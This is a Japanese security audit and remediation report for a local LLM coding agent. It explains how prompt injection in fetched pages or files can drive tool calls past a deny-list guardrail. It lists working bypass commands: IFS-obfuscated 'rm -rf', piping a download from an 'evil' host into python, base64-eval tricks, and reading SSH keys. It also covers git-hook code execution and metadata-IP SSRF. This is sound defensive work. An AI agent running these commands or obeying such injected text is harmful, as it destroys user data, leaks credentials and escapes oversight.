# セキュリティ監査レポートと是正タスク（2026-06-10）

> 対象コミット: `f294924` 時点 / 監査範囲: `internal/tools`, `internal/guardrail`, `internal/llm`, `internal/config`, `internal/cli`, `internal/agent`, `internal/log`
> 関連要件: SECURITY-05（入力検証）, SECURITY-11（セキュア設計＝ガードレール）, SECURITY-13（完全性）, SECURITY-15（フェイルセーフ）, SECURITY-09（ハードニング）

## サマリ

ShiroutoCode は「ローカル LLM が自律的にツールを呼ぶエージェント」であり、攻撃面の中心は **LLM 出力（＝信頼できない入力）がツール実行に直結する** 点にある。`web_fetch` で取得した Web ページや読み込んだファイルの内容にプロンプトインジェクションが混入すると、モデルが任意のツール呼び出しを生成しうる。したがってガードレール（`internal/guardrail`）が唯一の防御線であり、その強度がそのままシステムのセキュリティ強度になる。

現状のガードレールは **コマンドに対しては「ブロックリスト（deny-list）方式」** で、列挙された危険パターンに一致しないコマンドはすべて `Allow`（確認なしで実行）になる。これは設計上バイパスが容易で、いくつかの経路ではガードレールを完全に迂回して任意コード実行に至れる。以下、重大度順に課題と是正タスクを示す。

重大度の凡例: 🔴 High / 🟠 Medium / 🟡 Low

---

## 対応状況（2026-06-10 実装済み）

| ID | 重大度 | 状況 | 備考 |
|----|--------|------|------|
| F-01 | 🔴 | 一部対応 | `${IFS}`/`$IFS` 難読化の無効化・全インタプリタへのパイプ検知を実装。「未一致＝Allow」既定姿勢の変更は製品判断として保留（下記） |
| F-02 | 🔴 | ✅ 対応 | `.git/` 配下への書込/削除を `Confirm` 化 |
| F-03 | 🟠 | ✅ 対応 | 名前解決後IPで loopback/link-local/private/メタデータ/ULA をブロック（リダイレクト含む） |
| F-04 | 🟠 | ✅ 対応 | `FileTool` の write/delete でワークスペース境界を自己強制。機微パス外部読取を `Deny` 化 |
| F-05 | 🟠 | 一部対応 | 書込直前の再検証で TOCTOU 窓を縮小。`openat` 系の完全封じ込めは残存（下記） |
| F-06 | 🟠 | ✅ 対応 | 不正な deny パターンを `InvalidDenyPatterns` で検出し起動時に警告 |
| F-07 | 🟠 | ✅ 対応 | `git config --global/--system`・`hooksPath`・`git -c`・`--exec-path` を `Confirm` 化 |
| F-08 | 🟡 | ✅ 対応 | 非ループバック http エンドポイントを起動時に警告 |
| F-09 | 🟡 | ✅ 対応 | 確認プロンプト読取エラー時は常に拒否 |

**残存・要判断**:
- **F-01 既定姿勢**: 「deny-list 未一致コマンドを無確認で `Allow`」という設計は UX とのトレードオフのため未変更。allow-list 方式や「対話時は全コマンド既定 `Confirm`」への切替、`NonInteractivePolicy`（config 定義済み・ガードレール未接続）の評価器への接続は、製品方針の決定後に着手する。
- **F-05 完全封じ込め**: シンボリックリンク差し替えの厳密な防止（`O_NOFOLLOW`/`openat` ベースのパス走査）は単一ユーザのローカル前提では費用対効果が低く、再検証による緩和に留めた。
- **F-06 設定経路**: `ExtraDenyPatterns` は現状どの設定ソースからも読み込まれていない（`internal/config` 未配線）。検証ロジックは整備済みのため、配線追加時に有効化される。

実装パッケージ: `internal/guardrail`（rules/evaluator/scope）, `internal/tools`（web/file）, `internal/cli`（confirm/app）。全テスト緑（`go test ./... -race`、`go vet` クリーン）。

---

## F-01 🔴 `run_command` が任意シェル実行を許し、deny-list はバイパス容易

**場所**: `internal/tools/terminal.go:49`、`internal/guardrail/rules.go:15-107`、`internal/guardrail/evaluator.go:60-77`

**内容**:
- `run_command` は `sh -c <command_line>` でユーザ権限の任意シェルコマンドを実行する。cwd はワークスペースだが、コマンド自体は `cd ..`、`cat ~/.ssh/id_rsa`、`curl` による外部送信など、ユーザが到達できる全ファイル・全ネットワークにアクセスできる。封じ込めは一切ない。
- ガードレールはコマンドを deny-list で評価し、列挙パターン（`rm -rf /`、fork爆弾、`dd of=/dev/*`、`mkfs`、電源操作、`| sh|bash|zsh`）に一致しない限り **`Allow`（確認なし）**。非対話/CI でも確認なしで実行される（フェイルクローズはあくまで `Confirm`/`Deny`/`Unknown` 判定時のみ）。
- deny-list は文字列部分一致が中心のため迂回が容易。確認済みの具体例:
  - `rm${IFS}-rf${IFS}~` — `normalize` は展開しないため `"rm "`（末尾スペース）に一致せず `rmRootish` を回避。
  - `curl http://evil/x | python` / `... | perl` / `... | node` — `pipeToShell` は `sh|bash|zsh` のみ対象。
  - `find / -delete`、`shred`、`python3 -c "import shutil;shutil.rmtree('/')"`、`eval $(echo cm0gLXJmIH4= | base64 -d)`、変数間接化（`r=rm; $r -rf ~`）など。

**影響**: 信頼できない LLM 出力（プロンプトインジェクション含む）により、機密ファイル奪取・データ外部送信・破壊的操作が確認なしで実行されうる。これがシステム最大のリスク。

**是正タスク**:
- [ ] `run_command` の既定姿勢を「未一致＝Allow」から見直す。少なくとも対話モードでは全コマンドを既定 `Confirm` にする、もしくはallow-list 方式（明示的に許可したコマンドのみ無確認）を選択肢として導入する。
- [ ] deny-list は「境界」ではなく「多層防御の一層」であることをコード/ドキュメントに明記し、過信を防ぐ。
- [ ] 非対話/CI（`confirmer == nil`）でコマンド実行を許可する場合の既定ポリシーを明文化し、危険な既定値（無確認実行）を避ける。`NonInteractivePolicy`（config に定義済みだが現状ガードレールで未使用）を実際に評価へ接続する。
- [ ] 既知バイパス（`${IFS}`・変数間接化・非シェルインタプリタへのパイプ・base64/eval）の回帰テストを `internal/guardrail` に追加する。

---

## F-02 🔴 `.git/hooks` 書き込みによるガードレール完全バイパス（任意コード実行）

**場所**: `internal/guardrail/evaluator.go:29-47`、`internal/tools/file.go:32-54`

**内容**:
- `.git/` はワークスペース内なので、`write_file` で `.git/hooks/pre-commit`（や `post-checkout` 等）を作成するのは「ワークスペース内書き込み」として **確認なしで `Allow`**。
- その後 `git commit` 等を実行すると hook が起動し、deny-list を一切通らずに任意コードが実行される。`git config core.hooksPath <dir>` でも同様の効果が得られる（F-07 参照）。

**影響**: コマンド deny-list を完全に迂回した任意コード実行。F-01 の対策を入れても、この経路が残ると無効化される。

**是正タスク**:
- [ ] `.git/` 配下（特に `hooks/`）への `write_file`/`delete` を `Deny` または `Confirm` にする特別ルールを追加する。
- [ ] git 実行時に hook を抑止する選択肢（例: `core.hooksPath=/dev/null` 相当、`GIT_CONFIG_NOSYSTEM=1`、信頼できない hook の検出）を検討する。
- [ ] `.git/` 書き込み→`git commit` で hook が発火しないことの統合テストを追加する。

---

## F-03 🟠 `web_fetch` に SSRF 対策がない

**場所**: `internal/tools/web.go:41-58`、`internal/guardrail/rules.go:105-112`

**内容**:
- スキームが `http(s)` であること以外の検証がなく、`http://169.254.169.254/...`（クラウドメタデータ）、`http://localhost`、RFC1918 などの内部アドレスへ自由に到達できる。応答本文はモデルに返るため、内部サービスの偵察・資格情報の外部送信に悪用されうる。
- リダイレクトは最大5回まで追従するが（`web.go:27-32`）、ホストポリシーが存在しないためリダイレクト先の再検証もない。

**影響**: プロンプトインジェクションと組み合わせた SSRF・内部情報露出。クラウド/イントラ環境で特にリスク。

**是正タスク**:
- [ ] 名前解決後の宛先 IP を検査し、ループバック・リンクローカル（169.254.0.0/16, fe80::/10）・プライベート（10/8, 172.16/12, 192.168/16, fc00::/7）・メタデータIP をブロックする。
- [ ] 各リダイレクト先でも同じ IP ポリシーを再評価する。
- [ ] 許可ホストの allow-list 設定（任意）を検討。回帰テストを追加する。

---

## F-04 🟠 ツール層がワークスペース境界を自己強制しない（多層防御の欠如）

**場所**: `internal/tools/file.go:25-30,98-112`

**内容**:
- `FileTool.abs` / `ReadFileTool` は絶対パスをそのまま受理し `filepath.Clean` するのみ。封じ込めは完全に dispatcher/evaluator 依存。将来 dispatcher を経由しない呼び出し経路が追加されると無防備になる。
- `read_file` のワークスペース外読み取りは `Deny` ではなく **`Confirm`**（`evaluator.go:37-46`）。対話モードではソーシャルエンジニアリングで `~/.ssh/id_rsa` 等の承認を引き出せる余地がある（加えて F-01 の `run_command` 経由なら無確認で読める）。

**是正タスク**:
- [ ] ツール内部でもワークスペース境界を強制（defense-in-depth）する。
- [ ] 機微パス（`~/.ssh`, `~/.aws`, `/etc/shadow` 等）の読み取りを `Confirm` ではなく `Deny` 寄りに扱う方針を検討する。

---

## F-05 🟠 シンボリックリンクの TOCTOU（書き込み時）

**場所**: `internal/guardrail/scope.go:30-35,41-62`、`internal/tools/file.go:116-137`

**内容**:
- `resolveWithin` は「存在する最深祖先」のシンボリックリンクのみ解決する。未作成ファイルの最終要素はチェック時点ではリンクでないため、ガードレール判定と `writeAtomic` の `os.Rename` の間に親ディレクトリ等へシンボリックリンクが差し込まれると、ワークスペース外へ書き込まれうる（TOCTOU）。`os.Rename`/`os.MkdirAll` は親のリンクを追従する。

**是正タスク**:
- [ ] 書き込み直前に実パスを再検証する、または可能な箇所で `O_NOFOLLOW` を用いる。
- [ ] 同一ディレクトリ内 temp→rename の前提（親ディレクトリがワークスペース内である）を実行時に再確認する。

---

## F-06 🟠 不正な禁止パターン（ExtraDenyPatterns）が無言でフェイルオープン

**場所**: `internal/guardrail/evaluator.go:18-22`

**内容**:
- `regexp.Compile(p)` が失敗すると `err == nil` の分岐に入らず、その禁止パターンは **黙って無視** される。ユーザが追加した deny パターンにタイプミスがあると、保護が効かないのに警告も出ない（セキュリティ制御のフェイルオープン）。

**是正タスク**:
- [ ] 不正な正規表現は起動時エラーにする、または最低限 `Warn` ログで明示する。
- [ ] 設定検証（`internal/config`）側でも `ExtraDenyPatterns` のコンパイル可能性を検証する。

---

## F-07 🟠 `git` ツールが任意サブコマンドを許可（ワークスペース外への副作用）

**場所**: `internal/tools/git.go:23-36`、`internal/guardrail/rules.go:56-73,102-103`

**内容**:
- `Confirm` 対象は force push / 履歴改変 / push のみ。`op` は無制約のため `git config --global ...`（`~/.gitconfig` を改変）、`git config core.hooksPath ...`（F-02 と連動して任意コード実行）、`git -c ...` などワークスペース外への副作用や hook 経路を許す。

**是正タスク**:
- [ ] 安全な git サブコマンドの allow-list 化、または `config`（特に `--global`/`--system`/`hooksPath`）を `Confirm`/`Deny` にする。
- [ ] `git -c`/`--exec-path` 等のグローバル副作用フラグを検出する。

---

## F-08 🟡 LLM エンドポイントへの平文 HTTP を許可 / 送信内容が無検査

**場所**: `internal/config/config.go:321-330`、`internal/llm/client.go:137-145`

**内容**:
- エンドポイント検証は `http`/`https` 両方を許可。既定は localhost で問題ないが、リモートの `http://` を設定するとプロンプト・ファイル内容（機密を含みうる）が平文で送信される。TLS 強制やリモート利用時の警告がない。
- エージェントの性質上、読み込んだファイル内容はそのままモデルへ送られる（マスキングはログのみ／`internal/log`）。リモートエンドポイント前提では情報露出となる。

**是正タスク**:
- [ ] エンドポイントが非ループバックかつ `http://` の場合に警告する。
- [ ] 「エンドポイントはローカル/信頼境界内である」という信頼前提を README/ドキュメントに明記する。

---

## F-09 🟡 確認プロンプトのエッジケースと既定許可姿勢の明文化

**場所**: `internal/cli/confirm.go:24-31`、`internal/guardrail/evaluator.go:76-77`

**内容**:
- `Confirm` は `err != nil` でも `line != ""` のとき `parseYes(line)` を評価する（部分読み取り時の境界挙動）。実害は小さいが、フェイルセーフ観点では「エラー時は常に拒否」が望ましい。
- 評価器の最終既定は `Allow`（`evaluator.go:77`）。これは正常系の前提だが、F-01 と合わせ「未一致コマンドは無確認実行」という姿勢を設計判断として明文化すべき。

**是正タスク**:
- [ ] `Confirm` 読み取りでエラーが絡む場合は常に拒否側に倒す。
- [ ] 既定 `Allow` の妥当性を設計ドキュメントに記録し、レビュー対象とする。

---

## 良好だった点（参考）

- 出力上限（コマンド/Web とも 1MiB: `terminal.go:23`, `web.go:34`）、コマンドタイムアウトとプロセスグループ kill（`terminal.go:62-70`）で DoS/暴走を抑制。
- ログの機微情報マスキング（`internal/log`）はキー部分一致で過剰マスク寄り（フェイルセーフ）。
- 設定ロードはフェイルクローズで集約エラー（`internal/config`）。
- 非対話時の `Confirm`/`Deny` はフェイルクローズ（`dispatcher.go:43-55`）。
- `go.sum` 固定＋CI で `govulncheck`（SECURITY-10）。

## 推奨対応順

1. F-02（hooks 経由の任意コード実行）/ F-01（コマンド既定姿勢） — ガードレールの実効性に直結。
2. F-03（SSRF）/ F-07（git 副作用） — 外部・グローバル影響。
3. F-04 / F-05 / F-06 — 多層防御とフェイルセーフ。
4. F-08 / F-09 — ハードニングと明文化。
